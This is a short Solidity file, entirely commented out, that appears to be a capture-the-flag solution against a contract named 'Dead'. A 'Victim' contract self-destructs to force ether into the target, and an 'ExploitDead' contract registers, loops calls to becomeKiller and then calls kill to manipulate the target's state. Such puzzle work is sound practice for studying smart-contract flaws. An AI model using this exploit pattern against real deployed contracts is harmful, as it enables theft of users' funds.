// // SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.7.0;

// import "./Dead.sol";

// contract Victim {
//     Dead instance;

//     constructor(address exploitable) payable {
//         require(msg.value == 10 ether, "small amount");
//         instance = Dead(exploitable);
//         instance.register{value: 0.01 ether}(); // now exploiter balance = 0.01 ether and is registered
//         selfdestruct(payable(address(instance)));
//     }
// }

// contract ExploitDead {
//     Dead instance;

//     constructor(address exploitable) payable {
//         require(msg.value == 15 ether, "small amount");
//         instance = Dead(exploitable);
//         Victim victim = new Victim{value: 10 ether}(exploitable);
//         instance.register{value: 0.01 ether}(); // now exploiter balance = 0.01 ether and is registered
//         instance.canKill();
//         for (uint256 i = 0; i < 6; i++) {
//             instance.becomeKiller{value: 0.09 ether}();
//         }
//         instance.kill();
//     }

//     function finalize() external payable {
//         //instance.guess{value: 100}(42);
//     }

//     fallback() external payable {
//         //selfdestruct(payable(address(0)));
//     }

//     function getbal() external view returns (uint256) {
//         return address(this).balance;
//     }
// }
